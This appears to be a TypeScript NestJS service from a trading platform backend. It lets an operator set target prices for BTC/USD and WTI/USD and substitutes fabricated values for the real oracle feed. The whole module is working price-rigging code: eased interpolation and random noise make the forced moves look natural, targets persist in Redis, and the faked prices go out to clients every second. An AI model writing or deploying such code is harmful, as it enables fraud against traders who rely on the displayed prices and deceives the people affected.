import { Injectable, OnModuleInit, Logger, Inject, forwardRef } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { RedisService } from '../redis/redis.service';
import { Subject } from 'rxjs';
import { OracleService } from './oracle.service';

export interface PriceTarget {
    pair: string;
    targetPrice: number;
    startTime: Date;
    endTime: Date;
    direction: 'UP' | 'DOWN' | 'STABLE';
}

@Injectable()
export class PriceManipulationService implements OnModuleInit {
    private readonly logger = new Logger(PriceManipulationService.name);
    private readonly REDIS_KEY = 'active_manipulations';

    private priceTargets: Map<string, PriceTarget> = new Map();

    public priceUpdates$ = new Subject<{ symbol: string; price: number; timestamp: number }>();

    private basePrices: Map<string, number> = new Map([
        ['BTC/USD', 43000],
        ['WTI/USD', 75],
    ]);

    private currentPrices: Map<string, number> = new Map();

    constructor(
        private readonly redisService: RedisService,
        @Inject(forwardRef(() => OracleService))
        private readonly oracleService: OracleService,
    ) {
        this.basePrices.forEach((price, pair) => {
            this.currentPrices.set(pair, price);
        });
    }

    async onModuleInit() {
        await this.loadActiveTargets();
        setInterval(() => this.syncPricesFromOracle(), 30000);
        await this.syncPricesFromOracle();
    }


    private async syncPricesFromOracle() {
        try {
            for (const pair of this.basePrices.keys()) {
                const oraclePrice = await this.oracleService.getPrice(pair);
                if (oraclePrice > 0) {
                    if (!this.priceTargets.has(pair)) {
                        this.basePrices.set(pair, oraclePrice);
                        this.currentPrices.set(pair, oraclePrice);
                    }
                }
            }
        } catch (error) {
            this.logger.error('Failed to sync prices from Oracle', error);
        }
    }


    async resetToOraclePrice(pair: string): Promise<number> {
        const oraclePrice = await this.oracleService.getPrice(pair);
        if (oraclePrice > 0) {
            this.basePrices.set(pair, oraclePrice);
            this.currentPrices.set(pair, oraclePrice);
            this.cancelPriceTarget(pair);
            this.logger.log(`Reset ${pair} to Oracle price: ${oraclePrice}`);
            return oraclePrice;
        }
        throw new Error(`Failed to get Oracle price for ${pair}`);
    }

    private async loadActiveTargets() {
        try {
            const rawTargets = await this.redisService.getClient().hgetall(this.REDIS_KEY);
            const now = new Date();

            for (const [pair, data] of Object.entries(rawTargets)) {
                const target = JSON.parse(data) as PriceTarget;
                target.startTime = new Date(target.startTime);
                target.endTime = new Date(target.endTime);

                if (now < target.endTime) {
                    this.priceTargets.set(pair, target);
                    this.logger.log(`Restored active manipulation for ${pair}`);
                } else {
                    await this.redisService.getClient().hdel(this.REDIS_KEY, pair);
                }
            }
        } catch (error) {
            this.logger.error('Failed to load active targets from Redis', error);
        }
    }


    async setPriceTarget(
        pair: string,
        targetPrice: number,
        durationSeconds: number,
    ): Promise<PriceTarget> {
        const currentPrice = this.getCurrentPrice(pair);
        const direction = targetPrice > currentPrice ? 'UP' : targetPrice < currentPrice ? 'DOWN' : 'STABLE';

        const target: PriceTarget = {
            pair,
            targetPrice,
            startTime: new Date(),
            endTime: new Date(Date.now() + durationSeconds * 1000),
            direction,
        };

        this.priceTargets.set(pair, target);

        try {
            await this.redisService.getClient().hset(this.REDIS_KEY, pair, JSON.stringify(target));
        } catch (error) {
            this.logger.error(`Failed to persist target for ${pair} to Redis`, error);
        }

        this.logger.log(`[PriceManipulation] Target set: ${pair} from ${currentPrice} to ${targetPrice} in ${durationSeconds}s (${direction})`);

        return target;
    }

    getManipulatedPrice(pair: string): number {
        const target = this.priceTargets.get(pair);
        const basePrice = this.currentPrices.get(pair) || this.basePrices.get(pair) || 100;

        if (!target) {
            const variation = (Math.random() - 0.5) * basePrice * 0.001;
            const newPrice = basePrice + variation;
            this.currentPrices.set(pair, newPrice);
            return newPrice;
        }

        const now = new Date();

        if (now >= target.endTime) {
            this.priceTargets.delete(pair);
            this.currentPrices.set(pair, target.targetPrice);
            this.basePrices.set(pair, target.targetPrice);

            this.redisService.getClient().hdel(this.REDIS_KEY, pair).catch(err =>
                this.logger.error(`Failed to clean expired target ${pair} from Redis`, err)
            );

            return target.targetPrice;
        }

        const totalDuration = target.endTime.getTime() - target.startTime.getTime();
        const elapsed = now.getTime() - target.startTime.getTime();
        const progress = elapsed / totalDuration;

        const startPrice = this.basePrices.get(pair) || 100;
        const priceDiff = target.targetPrice - startPrice;

        const easedProgress = this.easeInOutQuad(progress);
        const interpolatedPrice = startPrice + priceDiff * easedProgress;

        const noise = (Math.random() - 0.5) * Math.abs(priceDiff) * 0.01;
        const finalPrice = interpolatedPrice + noise;

        this.currentPrices.set(pair, finalPrice);
        return finalPrice;
    }


    getCurrentPrice(pair: string): number {
        return this.currentPrices.get(pair) || this.basePrices.get(pair) || 100;
    }


    getActivePriceTargets(): PriceTarget[] {
        const now = new Date();
        const activeTargets: PriceTarget[] = [];

        Array.from(this.priceTargets.entries()).forEach(([pair, target]) => {
            if (now < target.endTime) {
                activeTargets.push(target);
            } else {
                this.priceTargets.delete(pair);
                this.redisService.getClient().hdel(this.REDIS_KEY, pair).catch(() => { });
            }
        });

        return activeTargets;
    }

    cancelPriceTarget(pair: string): boolean {
        const deleted = this.priceTargets.delete(pair);
        if (deleted) {
            this.redisService.getClient().hdel(this.REDIS_KEY, pair).catch(err =>
                this.logger.error(`Failed to delete target ${pair} from Redis`, err)
            );
        }
        return deleted;
    }

    setBasePrice(pair: string, price: number): void {
        this.basePrices.set(pair, price);
        this.currentPrices.set(pair, price);
    }

    getAllBasePrices(): { pair: string; price: number }[] {
        const prices: { pair: string; price: number }[] = [];
        this.basePrices.forEach((price, pair) => {
            prices.push({ pair, price: this.currentPrices.get(pair) || price });
        });
        return prices;
    }

    @Cron(CronExpression.EVERY_SECOND)
    handlePriceBroadcast() {
        this.basePrices.forEach((_, pair) => {
            const price = this.getManipulatedPrice(pair);
            this.priceUpdates$.next({
                symbol: pair,
                price,
                timestamp: Date.now(),
            });
        });
    }

    private easeInOutQuad(t: number): number {
        return t < 0.5 ? 2 * t * t : 1 - Math.pow(-2 * t + 2, 2) / 2;
    }
}
